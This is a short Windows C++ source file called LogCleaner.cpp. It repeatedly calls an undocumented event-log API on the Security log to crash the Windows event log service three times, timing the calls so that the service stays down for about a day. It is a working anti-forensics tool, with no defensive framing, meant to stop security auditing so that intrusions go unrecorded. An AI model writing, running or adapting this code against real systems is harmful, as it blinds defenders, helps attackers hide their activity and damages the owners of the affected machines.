// LogCleaner.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include <stdio.h>
#include <winbase.h>

typedef LONG NTSTATUS;
char* VERSION_NO = "1.0";

int main()
{
	printf("Starting log service crasher...\n");

	HANDLE eventlog = NULL;
	
	eventlog = OpenEventLogA(NULL, "Security");
	ElfClearEventLogFileW(eventlog, NULL);

	printf("First crash done. Waiting 65 seconds for service to restart itself...\n");

	Sleep(65000);

	eventlog = OpenEventLogA(NULL, "Security");
	ElfClearEventLogFileW(eventlog, NULL);

	printf("Second crash done. Waiting 125 seconds for service to restart itself...\n");

	Sleep(125000);

	eventlog = OpenEventLogA(NULL, "Security");
	ElfClearEventLogFileW(eventlog, NULL);

	printf("Third crash done. Log service should be restarted 1 day later.\n");

    return 0;
}

